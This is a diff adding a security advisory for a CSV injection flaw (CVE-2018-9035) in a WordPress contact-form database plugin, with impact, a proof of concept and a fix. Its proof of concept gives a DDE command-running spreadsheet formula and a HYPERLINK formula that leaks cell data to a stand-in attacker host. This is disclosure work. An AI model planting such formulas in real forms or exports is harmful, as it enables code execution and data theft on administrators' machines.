@@ -1,0 +1,40 @@
+# Exploit Title : Contact Form 7 to Database Extension Wordpress Plugin CSV Injection
+# Date: 23-03-2018 
+# Exploit Author : Stefan Broeder
+# Contact : https://twitter.com/stefanbroeder
+# Vendor Homepage: None
+# Software Link: https://wordpress.org/plugins/contact-form-7-to-database-extension
+# Version: 2.10.32
+# CVE : CVE-2018-9035
+# Category : webapps
+
+Description
+===========
+Contact Form 7 to Database Extension is a WordPress plugin with more than 400.000 active installations. Development is discontinued since 1 year. Version 2.10.32 (and possibly previous versions) are affected by a CSV Injection vulnerability.
+
+Vulnerable part of code
+=======================
+File: contact-form-7-to-database-extension/ExportToCsvUtf8.php:135 prints value of column without checking if it contains a spreadsheet formula.
+
+Impact
+======
+Arbitrary formulas can be injected into CSV/Excel files. 
+This can potentially lead to remote code execution at the client (DDE) or data leakage via maliciously injected hyperlinks.
+
+Proof of Concept
+============
+In order to exploit this vulnerability, the attacker needs to insert an Excel formula into any of the contact form fields available. This will end up in the log, and if a WordPress administrator chooses to export this log as Excel/CSV file, the file will contain the formula. If he then opens the file, the formula will be calculated. 
+
+Example:
+
+=cmd|'/C calc.exe'!Z0
+
+or
+
+=HYPERLINK("http://attacker.com/leak?="&A1&A2, "Click to load more data!")
+
+
+Solution
+========
+
+The plugin should escape fields starting with '=' when it exports data to CSV or Excel formats.
